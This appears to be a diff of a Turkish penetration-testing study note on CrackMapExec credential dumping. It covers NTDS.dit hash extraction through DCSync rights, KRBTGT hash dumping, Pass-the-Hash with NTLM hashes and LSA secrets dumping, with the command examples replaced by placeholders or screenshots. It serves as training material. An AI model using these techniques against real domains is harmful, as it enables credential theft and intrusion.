-Kimlik bilgilerinin alınabileceği bir başka yer de Active Directory veritabanıdır. ntds.dit dosyası, kullanıcı nesneleri, gruplar ve grup üyeliği hakkındaki bilgiler de dahil olmak üzere Active Directory verilerini depolayan bir veritabanıdır. Özellikle, dosya aynı zamanda domain'deki tüm kullanıcılar için parola hash'lerini de saklar (ve hatta bazen bir veya daha fazla hesap için tersine çevrilebilir şifreleme etkinleştirilmişse açık metin parolalarını da saklar). Bir Domain Admin hesabına veya bir replikasyon/DCSync gerçekleştirme ayrıcalıklarına sahip başka bir hesaba erişimimiz varsa, bir Domain Controller'dan hash'leri dökebiliriz
+Kimlik bilgilerinin alınabileceği bir başka yer de Active Directory veritabanıdır. ntds.dit dosyası, kullanıcı objeleri, gruplar ve grup üyeliği hakkındaki bilgiler de dahil olmak üzere Active Directory verilerini depolayan bir veritabanıdır. Özellikle, dosya aynı zamanda domain'deki tüm kullanıcılar için parola hash'lerini de saklar (ve hatta bazen bir veya daha fazla hesap için [reversible encryption](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) etkinleştirilmişse açık metin parolalarını da saklar). Bir Domain Admin hesabına veya bir replikasyon/DCSync gerçekleştirme ayrıcalıklarına sahip başka bir hesaba erişimimiz varsa, bir Domain Controller'dan hash'leri dökebiliriz
 
-https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption
+Hash'leri dump etmek için `--ntds` seçeneğini kullanmamız gerekir, aşağıdaki örnekte `robert` kullanıcısı bir Domain Admin değildir, ancak `replikasyon` gerçekleştirme ayrıcalıklarına sahiptir.
 
-Hash'leri dump etmek için --ntds seçeneğini kullanmamız gerekir, aşağıdaki örnekte robert kullanıcısı bir Domain Admin değildir, ancak replikasyon gerçekleştirme ayrıcalıklarına sahiptir.
+### Domain Controller üzerinden NTDS database dump etme
 
-Not: Aşağıdaki alıştırmalar proxy zincirlerini kullanır. Proxy zincirlerinin nasıl kurulacağı hakkında bilgi için CME ile Proxy Zincirleri bölümüne bakın.
+{{CODE_BLOCK_165}}
 
+`--ntds` seçeneğini kullanırken `--user` ve `--enabled` seçeneklerini dahil edebiliriz. Eğer `--user` kullanırsak ayıklamak istediğimiz kullanıcıyı belirtebiliriz. KRBTGT hesabı için hash dump alalım.
 
-### Domain Controller'dan NTDS veritabanını boşaltma
-![Pasted image 20241203104633.png](/img/user/resimler/Pasted%20image%2020241203104633.png)
-![Pasted image 20241203104643.png](/img/user/resimler/Pasted%20image%2020241203104643.png)
-![Pasted image 20241203104652.png](/img/user/resimler/Pasted%20image%2020241203104652.png)
-![Pasted image 20241203104711.png](/img/user/resimler/Pasted%20image%2020241203104711.png)
-![Pasted image 20241203104720.png](/img/user/resimler/Pasted%20image%2020241203104720.png)
-![Pasted image 20241203104725.png](/img/user/resimler/Pasted%20image%2020241203104725.png)
+### Yalnızca KRBTGT Hesabının Dump Edilmesi
 
---ntds seçeneğini kullanırken --user ve --enabled seçeneklerini dahil edebiliriz. Eğer --user kullanırsak ayıklamak istediğimiz kullanıcıyı belirtebiliriz. KRBTGT hesabı için hash dökümünü alalım.
+{{CODE_BLOCK_166}}
 
-
-### Yalnızca KRBTGT Hesabının Boşaltılması
-![Pasted image 20241203104803.png](/img/user/resimler/Pasted%20image%2020241203104803.png)
-
-Eğer --enabled olarak belirtirsek, sadece ekranda etkin olan kullanıcıları gösterecek ve bize etkin kullanıcıların listesini çıkarma seçeneği sunacaktır.
+Eğer `--enabled` olarak belirtirsek, sadece ekranda `etkin` olan kullanıcıları gösterecek ve bize etkin kullanıcıların listesini çıkarma seçeneği sunacaktır.
 
 
 ### Yalnızca Enabled Hesapları Gösterme
-![Pasted image 20241203105248.png](/img/user/resimler/Pasted%20image%2020241203105248.png)
-![Pasted image 20241203105301.png](/img/user/resimler/Pasted%20image%2020241203105301.png)
-![Pasted image 20241203105312.png](/img/user/resimler/Pasted%20image%2020241203105312.png)
-![Pasted image 20241203105319.png](/img/user/resimler/Pasted%20image%2020241203105319.png)
+
+{{CODE_BLOCK_167}}
 
 
-### Using the Secrets (hashes)
+### Secrets (hash'leri) kullanma
 
-Elde ettiğimiz şifreler NTLM hash'leridir. Hash'leri kırmayı deneyebilir veya parolayı kırmadan kullanıcı olarak kimlik doğrulaması yapmak için Pass the Hash tekniğini kullanabiliriz. 
+Elde ettiğimiz şifreler NTLM hash'leridir. Hash'leri kırmayı deneyebilir veya parolayı kırmadan kullanıcı olarak kimlik doğrulaması yapmak için `Pass the Hash` tekniğini kullanabiliriz. 
 
-CrackMapExec, parola yerine kimlik doğrulama yöntemi olarak bir NTLM hash'i gerektiren -H seçeneğine sahiptir:
-
+CrackMapExec, parola yerine kimlik doğrulama yöntemi olarak bir NTLM hash'i gerektiren `-H` seçeneğine sahiptir:
 
 ### Using NTLM Hashes
-![Pasted image 20241203105537.png](/img/user/resimler/Pasted%20image%2020241203105537.png)
+
+{{CODE_BLOCK_168}}
 
 NTLM kimlik doğrulaması SMB, WinRM , RDP, LDAP ve MSSQL protokolleri için desteklenir
 
 
 ### LSA Secrets/Cached Credentials
 
-CrackMapExec, herhangi bir aracı çalıştırmadan remote makineden hash'leri dökmek için çeşitli teknikler uygulayan impacket-secretsdump'dan taşınan --lsa seçeneği ile birlikte gelir. Önbelleğe alınmış kimlik bilgileri, local makine key listesi,[ Data Protection API (DPAPI)](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarları ve servis kimlik bilgileri dahil olmak üzere LSA Sırlarını döker.
+CrackMapExec, remote makineden herhangi bir agent çalıştırmadan hash dump işlemi gerçekleştiren `impacket-secretsdump`'tan alınmış `--lsa` seçeneğiyle birlikte gelir. Bu seçenek, Cached credentials, local machine key list, [Data Protection API (DPAPI)](https://en.wikipedia.org/wiki/Data_Protection_API) keys ve service credentials dahil olmak üzere LSA Secrets'ı dump eder.
 
-LSA Secrets, Windows'ta Local Security Authority (LSA) tarafından kullanılan kritik veriler için benzersiz bir korumalı depolama alanıdır. LSA, bir sistemin local security policy'sini yönetmek, denetlemek, kimlik doğrulamak, kullanıcıların sistemde oturumunu açmak, özel verileri depolamak vb. için tasarlanmıştır. Kullanıcıların ve sistemlerin hassas verileri gizli dosyalarda saklanır. [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarları verileri şifrelemek için kullanılır
+`LSA Secrets`, Windows'ta Local Security Authority (LSA) tarafından kullanılan kritik veriler için benzersiz bir korumalı depolama alanıdır. LSA, bir sistemin local security policy'sini yönetmek, denetlemek, kimlik doğrulamak, kullanıcıların sistemde oturumunu açmak, özel verileri depolamak vb. için tasarlanmıştır. Kullanıcıların ve sistemlerin hassas verileri gizli dosyalarda saklanır. [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarları verileri şifrelemek için kullanılır
 
 
-
+Burada Kaldım 
 ### LSA'yı inceleyin
 
 ![Pasted image 20241203105931.png](/img/user/resimler/Pasted%20image%2020241203105931.png)
